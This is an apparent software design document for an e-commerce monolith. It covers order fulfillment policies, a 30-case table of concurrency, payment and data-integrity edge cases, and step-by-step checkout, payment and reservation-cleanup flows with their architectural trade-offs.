### The Problem
User orders:
- 5× Laptop (stock: 5 — enough)
- 3× Mouse (stock: 1 — not enough, need 3)

What should happen? There is no universally correct answer. Different businesses have
fundamentally different requirements. The danger is that **developers make this decision
implicitly and inconsistently** — one developer writes "reject all if any item fails,"
another writes "ship what's available" — and the behavior is inconsistent depending on
which code path runs.

This is a business decision disguised as a technical problem. Without an explicit policy,
it leaks into business logic scattered across the codebase.

### Our Solution — `FulfillmentPolicy` Enum

The business explicitly configures ONE policy in `application.yml`:
```yaml
app.inventory.fulfillment-policy: REJECT_ALL
```

`InventoryService` reads the policy and branches:

| Policy | Behavior | When to use |
|--------|----------|-------------|
| `REJECT_ALL` | Any item OOS → reject entire order | Logically related items (product sets) |
| `PARTIAL_FULFILL` | Ship what's available, skip OOS | Independent items (groceries) |
| `BACKORDER` | Hold everything, ship available now, rest later | B2B, specialty goods |
| `WAIT_FOR_ALL` | Hold entire order until all items in stock | Gift sets, subscription boxes |

### Why This Approach?

**Alternative: Hardcode REJECT_ALL**
> "Just always reject if any item is out of stock."

❌ **Fine for most cases, but wrong for groceries/general merchandise.** If a user orders 50 items
and one is OOS, rejecting all 50 creates enormous frustration and cart abandonment.

**Alternative: if-else in service code**
> "Check `if itemType == GROCERY then partialFulfill else rejectAll`."

❌ **Business rules scattered in code.** Changing the policy requires a code change and
deployment. Non-technical business stakeholders cannot understand or verify the behavior.

**Why enum + config:**
- Changing policy requires only a config change (no deployment in many setups)
- The enum documents ALL possible policies with their trade-offs (as code comments)
- Adding a new policy is a single enum value + a new branch in `InventoryService`
- Business can make the decision without understanding the code

**Trade-off: PARTIAL_FULFILL requires complex billing**
If you ship 5 of 8 items, you need to:
- Charge only for the shipped items (or charge all, refund OOS)
- Create separate shipment records per batch
- Handle the OOS items separately (cancel, notify, waitlist)

This is significant complexity. `REJECT_ALL` is simpler and is the correct default
until the business explicitly needs partial fulfillment.

**Code:** [`FulfillmentPolicy.java`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/domain/inventory/enums/FulfillmentPolicy.java)

---

## Complete Decision Matrix (All 30 Cases)

| # | Edge Case | Core Mechanism | Key Alternative Rejected | Key Trade-off |
|---|-----------|---------------|--------------------------|---------------|
| 1 | Idempotency Key | Client UUID + DB UNIQUE | Time-window → false positives | Client must persist the key |
| 2 | Optimistic Locking | `@Version` + retry | `synchronized` → single JVM | Retry latency under conflict |
| 3 | Pessimistic Lock (payment) | `SELECT FOR UPDATE` | Optimistic → retry → double charge | Queue under high concurrency |
| 4 | Price Snapshot | Snapshot at add, reject at checkout | Always live → legal risk | Checkout friction on change |
| 5 | Reservation TTL | Scheduled expiry job | "Release on failure" → leaks on crash | 5-min polling lag |
| 6 | Soft Delete | `is_active` flag | Physical delete → FK breaks + illegal | Ghost rows accumulate |
| 7 | Concurrent Cart | `SELECT FOR UPDATE` | Optimistic → confusing retry UX | Queue under concurrent edits |
| 8 | Order State Machine | Enum `validateTransitionTo()` | if-else chains → scattered | Transition map must be maintained |
| 9 | Duplicate Payment | DB `UNIQUE(order_id)` | App-only → race condition window | Requires exception handling |
| 10 | Refund State Machine | State-based idempotency | Count check → race condition | `REFUND_FAILED` needs human review |
| 11 | Outbox Pattern | Same-TX write + poller | `@TransactionalEventListener` → no retry | ~500ms delay; at-least-once |
| 12 | Rate Limiting | In-memory AOP annotation | Nginx IP-only → bypassed by user auth | Not multi-instance (use Redis) |
| 13 | Read-after-Write | `@Transactional(readOnly=true)` | Always primary → defeats read replicas | Not complete for distributed |
| 14 | Atomic SQL Decrement | `UPDATE WHERE qty >= N` | Optimistic retry storm → thundering herd | `@Version` becomes stale |
| 15 | JWT Token Version | `token_version` column | Short expiry → bad UX | Revokes ALL sessions at once |
| 16 | Address Ownership | Service-layer BOLA check | Query-level filter → 404 vs 403 | Must add to every new endpoint |
| 17 | Checkout Atomicity | Single `@Transactional` | Saga → massive complexity | Long TX holds connection |
| 18 | Notification Dedup | App check + DB UNIQUE | Provider-level → not universal | Still at-least-once |
| 19 | Graceful Shutdown | `server.shutdown: graceful` | Kill immediately → in-flight 500s | Slow requests delay shutdown |
| 20 | Input Sanitization | Parameterized queries + `@Valid` | Blacklisting → bypassed by encoding | Validation UX must be clean |
| 21 | Coupon Race Condition | Pre-flight + atomic SQL + UNIQUE | `FOR UPDATE` → serializes all users | Rollback edge cases |
| 22 | Money Precision | `BigDecimal` + `HALF_UP` + `MoneyUtils` | `double` → accumulating errors | Slower than float (irrelevant) |
| 23 | N+1 Query | Two-query pagination pattern | EAGER fetch → always N+1 | Slightly more code |
| 24 | Connection Pool Exhaustion | Tight timeout + leak detection + TX timeout | Bigger pool → DB crashes | Tight timeout rejects slow-but-valid |
| 25 | Database Deadlock | Consistent lock ordering + retry | SERIALIZABLE → 30-50% abort rate | Retry adds latency |
| 26 | Dead Letter Queue | Separate DLQ table + replay endpoint | Delete failed → silent data loss | Requires human intervention |
| 27 | Clock Safety / UTC | `Instant` everywhere + `TIMESTAMPTZ` | `LocalDateTime` → timezone bugs on migration | UTC confuses business users |
| 28 | Large Payload Protection | `max-swallow-size` + `@Size` | WAF only → bypassed by direct access | Blocks legitimately large files |
| 29 | Audit Log Immutability | `@Immutable` + no setters + DB RLS | Rely on discipline → always fails | Cannot fix incorrectly recorded records |
| 30 | Partial Fulfillment Policy | Config-driven `FulfillmentPolicy` enum | Hardcode → wrong for some businesses | PARTIAL_FULFILL needs complex billing |


## 1. API Endpoint 1: Create Checkout Session (Phase 1)

**Route:** `POST /api/v1/checkout/session`
**Input:** Cart ID, User ID.
**Goal:** Lock inventory with a strict timer and create the idempotency key.

**Code Logic Execution Flow:**

1. **Calculate Total & Generate Keys:** Read the requested items, multiply prices by quantities for the `total_amount`, and generate a unique random string (UUID) for the `idempotency_key` and each `reservation_id`.
2. **Start Database Transaction:** (This ensures if anything fails, no partial data is saved).
3. **Check and Lock Inventory:** For every item, execute an update query: `UPDATE products SET available_stock = available_stock - requested_quantity WHERE product_id = 'X' AND available_stock >= requested_quantity`.
* *If the query updates 0 rows:* The item is out of stock. Throw an error, cancel the transaction, and return a "Not enough stock" message to the client.


4. **Create Reservations:** Insert a row into the `inventory_reservations` table for each item. Set `status = 'HELD'` and set `expires_at` to exactly 15 minutes from the current time.
5. **Save Session:** Insert a new row into the `checkout_sessions` table with the key, total amount, user ID, and set `status = 'CREATED'`.
6. **Commit Database Transaction:** Save all changes permanently.
7. **Return to Client:** Send the `idempotency_key` and the 15-minute expiration time back to the client application.

---

## 2. API Endpoint 2: Execute Payment (Phase 2)

**Route:** `POST /api/v1/checkout/execute`
**Input:** Payment Details (like credit card token).
**Headers:** `Idempotency-Key: <the_key_from_phase_1>`
**Goal:** Verify the inventory reservation, safely process the money, and create the final order.

**Code Logic Execution Flow:**

**Step A: The Idempotency & Expiration Check**

1. **Read Session:** Query the `checkout_sessions` table using the key from the header.
2. **Check Session Status:**
* If key does not exist: Return HTTP 400 (Bad Request).
* If status == 'SUCCESS': Return the saved `response_body`. Stop executing.
* If status == 'PAYMENT_PROCESSING': Return HTTP 409 (Conflict). Tell the client "Payment is currently running, please wait." Stop executing.
* If status == 'CREATED' or 'PAYMENT_FAILED': Proceed to the next check.


3. **Check Reservation Expiration:** Query the `inventory_reservations` table. Compare the current time to the `expires_at` time.
* *If current time > expires_at:* Return HTTP 400. Tell the client "Your reservation expired, please refresh your cart." Stop executing.



**Step B: The Order Preparation**
4. **Start Database Transaction:**
5. **Update Session:** Change `checkout_sessions.status` to `PAYMENT_PROCESSING`.
6. **Check for Existing Order:** Did a previous payment fail? If yes, an order might already exist. Look at `checkout_sessions.order_id`.
* *If no order exists:* Create a new row in the `orders` table (with status `PENDING`). Create rows in the `order_items` table. Link the new `order_id` to the `checkout_sessions` table.
7. **Commit Database Transaction:** (You must commit here so the `PAYMENT_PROCESSING` status is saved before you talk to the external payment provider).

**Step C: The Payment Execution**
8. **Call Payment Provider:** Send the `total_amount` and credit card details to your payment provider (like Stripe). Include your `order_id` so the provider has a record of it.
9. **Wait for Response.**

**Step D: The Final Result**
10. **Start Database Transaction:**
11. **If Payment Succeeded:**
* Insert a row into `payments` table with status = 'SUCCESS'.
* Update `orders` table to status = 'PAID'.
* Update `checkout_sessions` to status = 'SUCCESS'. Save the final JSON response text into the `response_body` column.
* Update `inventory_reservations` to status = 'COMPLETED'.
12. **If Payment Failed:**
* Insert a row into `payments` table with status = 'FAILED'.
* Update `orders` table to status = 'PENDING'.
* Update `checkout_sessions` to status = 'PAYMENT_FAILED'.
* *Do NOT update reservations.* Leave them as `HELD` so the user can try paying again within their 15-minute window.
13. **Commit Database Transaction.**
14. **Return to Client:** Send the final success or error response.

---

## 3. Background Job: Cleanup Expired Reservations (Phase 3)

**Execution (Runs automatically every 1 minute):**

**Code Logic Execution Flow:**

1. **Find Expired Items:** Query `inventory_reservations` where `status = 'HELD'` AND `expires_at < CURRENT_TIME`.
2. **Start Database Transaction:**
3. **Return Stock:** For every expired item, execute: `UPDATE products SET available_stock = available_stock + expired_quantity WHERE product_id = 'X'`.
4. **Update Reservations:** Change these specific rows in `inventory_reservations` to `status = 'EXPIRED'`.
5. **Update Sessions:** Find the `checkout_sessions` connected to these reservations and update their status to `EXPIRED`.
6. **Commit Database Transaction.**

---

## Architectural Decision Review: Explicit Inventory Reservations

**1. What problem does this solve?**
It prevents the permanent loss of inventory. If you only subtract numbers from a product table, an abandoned cart means that product is gone forever. This design leaves a clear paper trail, allowing a background system to safely return items to the shelf if the user walks away.

**2. Why choose it?**
It handles the reality of network communication and user behavior. Users often close their browsers or have their credit cards declined. Giving them a dedicated 15-minute hold guarantees they have time to fix payment issues without losing the item, while ensuring the business does not lose stock permanently.

**3. What are the trade-offs?**

* **Pros:** Highly accurate tracking of items. Excellent user experience during payment failures. Prevents race conditions at checkout.
* **Cons:** Increases database size rapidly. Requires you to write, deploy, and monitor a separate background worker process to clean up the data.

**4. What alternatives exist?**
You could check inventory strictly at the exact moment of payment execution (Phase 2, Step C). You read the stock, try to pay, and deduct it only if the payment succeeds.

**5. Under what conditions would another choice be better?**
Checking stock only at payment execution is better for stores with infinite digital goods (like software downloads) or massive warehouses where items rarely sell out. However, if you are selling items with limited stock (like concert tickets or limited-edition clothing), the explicit reservation system is mandatory to prevent angry customers who click "Pay" only to find out the item vanished from their cart.

How do you plan to handle the situation where a customer's payment succeeds at the exact same moment your background job attempts to mark their reservation as expired?